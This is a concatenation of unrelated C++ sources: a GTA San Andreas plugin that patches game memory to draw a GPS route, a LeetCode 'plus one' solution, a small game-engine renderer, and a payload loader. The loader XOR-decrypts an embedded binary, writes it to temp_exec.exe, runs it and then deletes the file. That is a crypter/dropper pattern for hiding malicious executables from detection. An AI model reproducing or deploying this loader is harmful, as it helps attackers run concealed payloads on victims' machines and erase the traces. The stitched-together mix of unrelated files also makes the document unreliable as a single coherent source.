#define MAX_NODE_POINTS 50000
#define GPS_LINE_WIDTH  4.0f
#define GPS_LINE_R  180
#define GPS_LINE_G  24
#define GPS_LINE_B  24
#define GPS_LINE_A  255
#define MAX_TARGET_DISTANCE 10.0f

using namespace plugin;

class GPSLine {
public:

    GPSLine() {
        static bool gpsShown;
        static float gpsDistance;
        static CNodeAddress resultNodes[MAX_NODE_POINTS];
        static CVector2D nodePoints[MAX_NODE_POINTS];
        static RwIm2DVertex lineVerts[MAX_NODE_POINTS * 4];

        static char pathNodesToStream[1024];
        static int pathNodes[50000];

        for (int i = 0; i < 1024; i++) {
            pathNodesToStream[i] = 1;
        }

        for (int i = 0; i < 50000; i++) {
            pathNodes[i] = -1;
        }

        patch::SetPointer(0x44DE3C, &pathNodesToStream);
        patch::SetPointer(0x450D03, &pathNodesToStream);
        patch::SetPointer(0x451782, &pathNodes);
        patch::SetPointer(0x451904, &pathNodes);
        patch::SetPointer(0x451AC3, &pathNodes);
        patch::SetPointer(0x451B33, &pathNodes);
        patch::SetUInt(0x4518F8, 50000);
        patch::SetUInt(0x4519B0, 49950);

        if (GetModuleHandleA("SAMP.dll")) return; //don't run if SAMP

        Events::gameProcessEvent += []() {
            if (FrontEndMenuManager.m_nTargetBlipIndex
                && CRadar::ms_RadarTrace[LOWORD(FrontEndMenuManager.m_nTargetBlipIndex)].m_nCounter == HIWORD(FrontEndMenuManager.m_nTargetBlipIndex)
                && CRadar::ms_RadarTrace[LOWORD(FrontEndMenuManager.m_nTargetBlipIndex)].m_nBlipDisplayFlag
                && FindPlayerPed()
                && DistanceBetweenPoints(CVector2D(FindPlayerCoors(0)),
                CVector2D(CRadar::ms_RadarTrace[LOWORD(FrontEndMenuManager.m_nTargetBlipIndex)].m_vPosition)) < MAX_TARGET_DISTANCE)
            {
                CRadar::ClearBlip(FrontEndMenuManager.m_nTargetBlipIndex);
                FrontEndMenuManager.m_nTargetBlipIndex = 0;
            }
        };

        Events::drawRadarOverlayEvent += []() {
            gpsShown = false;
            CPed* playa = FindPlayerPed(0);
            if (playa
                && playa->m_pVehicle
                && playa->m_nPedFlags.bInVehicle
                && playa->m_pVehicle->m_nVehicleSubClass != VEHICLE_PLANE
                && playa->m_pVehicle->m_nVehicleSubClass != VEHICLE_HELI
                && playa->m_pVehicle->m_nVehicleSubClass != VEHICLE_BMX
                && FrontEndMenuManager.m_nTargetBlipIndex
                && CRadar::ms_RadarTrace[LOWORD(FrontEndMenuManager.m_nTargetBlipIndex)].m_nCounter == HIWORD(FrontEndMenuManager.m_nTargetBlipIndex)
                && CRadar::ms_RadarTrace[LOWORD(FrontEndMenuManager.m_nTargetBlipIndex)].m_nBlipDisplayFlag)
            {
                CVector destPosn = CRadar::ms_RadarTrace[LOWORD(FrontEndMenuManager.m_nTargetBlipIndex)].m_vPosition;
                destPosn.z = CWorld::FindGroundZForCoord(destPosn.x, destPosn.y);

                short nodesCount = 0;

                ThePaths.DoPathSearch(0, FindPlayerCoors(0), CNodeAddress(), destPosn, resultNodes, &nodesCount, MAX_NODE_POINTS, &gpsDistance,
                                      999999.0f, NULL, 999999.0f, false, CNodeAddress(), false, playa->m_pVehicle->m_nVehicleSubClass == VEHICLE_BOAT);

                if (nodesCount > 0) {
                    for (short i = 0; i < nodesCount; i++) {
                        CVector nodePosn = ThePaths.GetPathNode(resultNodes[i])->GetNodeCoors();
                        CVector2D tmpPoint;
                        CRadar::TransformRealWorldPointToRadarSpace(tmpPoint, CVector2D(nodePosn.x, nodePosn.y));
                        if (!FrontEndMenuManager.drawRadarOrMap)
                            CRadar::TransformRadarPointToScreenSpace(nodePoints[i], tmpPoint);
                        else {
                            CRadar::LimitRadarPoint(tmpPoint);
                            CRadar::TransformRadarPointToScreenSpace(nodePoints[i], tmpPoint);
                            nodePoints[i].x *= static_cast<float>(RsGlobal.maximumWidth) / 640.0f;
                            nodePoints[i].y *= static_cast<float>(RsGlobal.maximumHeight) / 448.0f;
                            CRadar::LimitToMap(&nodePoints[i].x, &nodePoints[i].y);
                        }
                    }

                    if (!FrontEndMenuManager.drawRadarOrMap
                        && reinterpret_cast<D3DCAPS9 const*>(RwD3D9GetCaps())->RasterCaps & D3DPRASTERCAPS_SCISSORTEST)
                    {
                        RECT rect;
                        CVector2D posn;
                        CRadar::TransformRadarPointToScreenSpace(posn, CVector2D(-1.0f, -1.0f));
                        rect.left = static_cast<LONG>(posn.x + 2.0f);
                        rect.bottom = static_cast<LONG>(posn.y - 2.0f);
                        CRadar::TransformRadarPointToScreenSpace(posn, CVector2D(1.0f, 1.0f));
                        rect.right = static_cast<LONG>(posn.x - 2.0f);
                        rect.top = static_cast<LONG>(posn.y + 2.0f);
                        GetD3DDevice()->SetRenderState(D3DRS_SCISSORTESTENABLE, TRUE);
                        GetD3DDevice()->SetScissorRect(&rect);
                    }

                    RwRenderStateSet(rwRENDERSTATETEXTURERASTER, NULL);

                    unsigned int vertIndex = 0;
                    for (short i = 0; i < (nodesCount - 1); i++) {
                        CVector2D point[4], shift[2];
                        CVector2D dir = nodePoints[i + 1] - nodePoints[i];
                        float angle = atan2(dir.y, dir.x);
                        if (!FrontEndMenuManager.drawRadarOrMap) {
                            shift[0].x = cosf(angle - 1.5707963f) * GPS_LINE_WIDTH;
                            shift[0].y = sinf(angle - 1.5707963f) * GPS_LINE_WIDTH;
                            shift[1].x = cosf(angle + 1.5707963f) * GPS_LINE_WIDTH;
                            shift[1].y = sinf(angle + 1.5707963f) * GPS_LINE_WIDTH;
                        }
                        else {
                            float mp = FrontEndMenuManager.m_fMapZoom - 140.0f;
                            if (mp < 140.0f)
                                mp = 140.0f;
                            else if (mp > 960.0f)
                                mp = 960.0f;
                            mp = mp / 960.0f + 0.4f;
                            shift[0].x = cosf(angle - 1.5707963f) * GPS_LINE_WIDTH * mp;
                            shift[0].y = sinf(angle - 1.5707963f) * GPS_LINE_WIDTH * mp;
                            shift[1].x = cosf(angle + 1.5707963f) * GPS_LINE_WIDTH * mp;
                            shift[1].y = sinf(angle + 1.5707963f) * GPS_LINE_WIDTH * mp;
                        }
                        Setup2dVertex(lineVerts[vertIndex + 0], nodePoints[i].x + shift[0].x, nodePoints[i].y + shift[0].y);
                        Setup2dVertex(lineVerts[vertIndex + 1], nodePoints[i + 1].x + shift[0].x, nodePoints[i + 1].y + shift[0].y);
                        Setup2dVertex(lineVerts[vertIndex + 2], nodePoints[i].x + shift[1].x, nodePoints[i].y + shift[1].y);
                        Setup2dVertex(lineVerts[vertIndex + 3], nodePoints[i + 1].x + shift[1].x, nodePoints[i + 1].y + shift[1].y);
                        vertIndex += 4;
                    }

                    RwIm2DRenderPrimitive(rwPRIMTYPETRISTRIP, lineVerts, 4 * (nodesCount - 1));

                    if (!FrontEndMenuManager.drawRadarOrMap
                        && reinterpret_cast<D3DCAPS9 const*>(RwD3D9GetCaps())->RasterCaps & D3DPRASTERCAPS_SCISSORTEST)
                    {
                        GetD3DDevice()->SetRenderState(D3DRS_SCISSORTESTENABLE, FALSE);
                    }

                    gpsDistance += DistanceBetweenPoints(FindPlayerCoors(0), ThePaths.GetPathNode(resultNodes[0])->GetNodeCoors());
                    gpsShown = true;
                }
            }
        };

        Events::drawHudEvent += [] {
            if (gpsShown) {
                CFont::SetOrientation(ALIGN_CENTER);
                CFont::SetColor(CRGBA(200, 200, 200, 255));
                CFont::SetBackground(false, false);
                CFont::SetWrapx(500.0f);
                CFont::SetScale(0.4f * static_cast<float>(RsGlobal.maximumWidth) / 640.0f,
                                0.8f * static_cast<float>(RsGlobal.maximumHeight) / 448.0f);
                CFont::SetFontStyle(FONT_SUBTITLES);
                CFont::SetProportional(true);
                CFont::SetDropShadowPosition(1);
                CFont::SetDropColor(CRGBA(0, 0, 0, 255));
                CVector2D radarBottom;
                CRadar::TransformRadarPointToScreenSpace(radarBottom, CVector2D(0.0f, -1.0f));
                char text[16];
                if (gpsDistance > 1000.0f)
                    sprintf(text, "%.2fkm", gpsDistance / 1000.0f);
                else
                    sprintf(text, "%dm", static_cast<int>(gpsDistance));
                CFont::PrintString(radarBottom.x, radarBottom.y + 8.0f * static_cast<float>(RsGlobal.maximumHeight) / 448.0f, text);
            }
        };
    }

    static void Setup2dVertex(RwIm2DVertex& vertex, float x, float y) {
        vertex.x = x;
        vertex.y = y;
        vertex.u = vertex.v = 0.0f;
        vertex.z = CSprite2d::NearScreenZ + 0.0001f;
        vertex.rhw = CSprite2d::RecipNearClip;
        vertex.emissiveColor = RWRGBALONG(GPS_LINE_R, GPS_LINE_G, GPS_LINE_B, GPS_LINE_A);
    }

} gPSLine;

#include <Windows.h>
#include <iostream>
#include <vector>
#include <cstdint>
#include <string>
#include <fstream>
#include "../temp/data.h"
#include "../headers/key.h"

extern const unsigned char DATA[];
extern const unsigned int DATA_LEN;

uint8_t hash_1b(const std::string& seed) {
    uint8_t key = VM_KEY;
    for (size_t i = 0; i < seed.size(); i++) {
        key = ((key ^ seed[i]) * 0x83) ^ (key >> 3);
    }

    return key;
}

// This run code is Derived using common development resources
bool ExecuteAndDeleteFile(const std::string& fileName) {
    // Start the executable
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcess(nullptr, const_cast<LPSTR>(fileName.c_str()), nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        std::cerr << "CreateProcess failed with error " << GetLastError() << std::endl;
        return false;
    }

    // Wait for the process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    // Now delete the file after the process has finished
    if (!DeleteFile(fileName.c_str())) {
        std::cerr << "Failed to delete temporary file. Error: " << GetLastError() << std::endl;
        return false;
    }

    return true;
}

int main() {
    // Initialize data_copy with the correct size
    std::vector<unsigned char> data_copy(DATA_LEN);

    uint8_t k = hash_1b(KEY);

    for (size_t i = 0; i < DATA_LEN; i++) {
        data_copy[i] = static_cast<unsigned char>(DATA[i] ^ k); // Ensure to use unsigned char
    }


    std::string tempFileName = "temp_exec.exe";

    // Write the decrypted data to a temporary file
    std::ofstream tempFile(tempFileName, std::ios::binary);
    if (!tempFile) {
        std::cerr << "Failed to create temporary file." << std::endl;
        return 1;
    }
    tempFile.write(reinterpret_cast<const char*>(data_copy.data()), data_copy.size());
    tempFile.close();

    // Execute and delete the temporary file
    ExecuteAndDeleteFile(tempFileName);

    return 0;
}

// https://leetcode.com/problems/plus-one/description/?envType=study-plan-v2&envId=top-interview-150
// Help Referenced via basic programming materials

class Solution
{
public:
    vector<int> plusOne(vector<int> &v)
    {
        int n = v.size();
        for (int i = n - 1; i >= 0; i--)
        {
            if (v[i] < 9)
            {
                v[i]++; // Increment and return if no carry
                return v;
            }
            v[i] = 0; // Set current digit to 0 and propagate carry
        }
        // If all digits were 9, insert 1 at the beginning (e.g., 999 → 1000)
        v.insert(v.begin(), 1);
        return v;
    }
};

#include "pfpch.h"

namespace Pitfall
{
	Renderer* Renderer::s_Instance = new Renderer();

	void Renderer::Init(const RendererProperties& properties)
	{
		s_Instance->m_Properties = properties;

		// These are 1 off calculations so they are done while initializing to reduce the amount of unneccesary calculations.
		s_Instance->m_ScreenSize = { properties.Screen->width, properties.Screen->height };
		s_Instance->m_HalfScreenSize = { s_Instance->m_ScreenSize.x * 0.5f, s_Instance->m_ScreenSize.y * 0.5f };
		s_Instance->m_HalfWorldSize = { s_Instance->m_HalfScreenSize / PIXELS_PER_METER };
		s_Instance->m_ResolutionMultiplier = Cast<float>(SCRWIDTH) / 1270.0f;
	}

	void Renderer::Render() // Big: O(n)
	{
		s_Instance->m_RenderScale = s_Instance->m_Camera->GetRenderSize() * s_Instance->m_ResolutionMultiplier;

		for(uint32_t i = 0; i < s_Instance->m_RenderList.Size(); i++) // O(n)
		{
			GameObject* obj = s_Instance->m_RenderList[i];			  // O(1)

			if (obj)
			{
				// Update the sprite rect position so that the rendering actually follows the player.
				obj->UpdateSpriteRectPosition();

				if (obj->ShouldRender())
				{
					obj->Render();
				}
			}
		}
	}

	void Renderer::Clear(const uint32_t color)
	{
		s_Instance->m_Properties.Screen->Clear(color);
	}

	void Renderer::Add(GameObject* object) // Big: O(n)
	{		
		// Check if the object contains a renderable.
		if (!object->GetRenderable())
		{
			Print((String("Object with name: ") + object->Name() + String(" does not contain a Renderable")).Cstr());
			return;
		}

		for (uint32_t i = 0; i < s_Instance->m_RenderList.Size(); i++) // O(n)
		{
			if (!s_Instance->m_RenderList[i])
			{
				s_Instance->m_RenderList[i] = object;				   // O(1)
				return;
			}
		}

		Assert(false, "Renderable list overflow.");

	}

	void Renderer::Remove(GameObject* object) // Big: O(n)
	{
		for (int i = 0; i < MAX_RENDERABLES; i++)					   // O(n)
		{
			if (object == s_Instance->m_RenderList[i])				   
			{
				s_Instance->m_RenderList[i] = nullptr;				   // O(1)
				return;
			}
		}

		Print("Renderable could not be found");
	}

	void Renderer::Reset() // Big: O(1)
	{
		memset(&s_Instance->m_RenderList[0], 0, sizeof(s_Instance->m_RenderList));
	}

	void Renderer::Sort() // Big: O(n2)
	{
		//TODO Use a better sorting algorithm or better yet insert-sort every object you add.


		auto& rList = s_Instance->m_RenderList;

		// Bubblesort sorting algorithm Crafted with standard coding tools.
		bool swapped;

		for (uint32_t i = 0; i < rList.Size() - 1; i++) // O(n2)
		{
			swapped = false;

			for (uint32_t j = 0; j < rList.Size() - 1; j++)
			{
				// Compare objects based on their z-index values
				if (!rList[j + 1] || !rList[j] ||
					rList[j]->GetRenderable()->m_ZIndex > rList[j + 1]->GetRenderable()->m_ZIndex)
				{
					// Swap the objects
					GameObject* tempA = rList[j];	  // O(1)
					GameObject* tempB = rList[j + 1]; // O(1)

					rList[j] = tempB;	   // O(1)
					rList[j + 1] = tempA;  // O(1)

					swapped = true;
				}
			}

			// If no two objects were swapped in the inner loop, the array is already sorted
			if (!swapped)
			{
				break;
			}
		}
	}

	int2 Renderer::WorldToScreenSpace(const float2& position)
	{
		// Calculates for 32 pixels per 1 unit.
		// Position 0, 0 is in the middle of the screen.
		// View position (Camera position) is accounted for.
		const float2 worldPosition = (position * s_Instance->m_RenderScale + HalfWorldSize() - WorldViewPosition()) * PIXELS_PER_METER;

		// Y-Axis gets flipped so that Index 0, 0 is at the bottom left instead of top left and +Y goes up instead of down.
		const int2 flippedWorldPosition = FlipVerticalScreenSpace(int2(Math::CeilToInt(worldPosition.x), Math::CeilToInt(worldPosition.y)));

		return flippedWorldPosition;
	}

	int2 Renderer::WorldToScreenSize(const float2& size)
	{
		return { WorldToScreenSize(size.x), WorldToScreenSize(size.y) };
	}

	int Renderer::WorldToScreenSize(const float size)
	{
		return Math::CeilToInt(size * s_Instance->m_RenderScale * PIXELS_PER_METER);
	}

	RectInt Renderer::WorldRectToScreenRect(const RectFloat& rect)
	{
		const int2 screenPos = WorldToScreenSpace(rect.Pos);
		const int2 screenSize = WorldToScreenSize(rect.Size);

		return { screenPos, screenSize };
	}

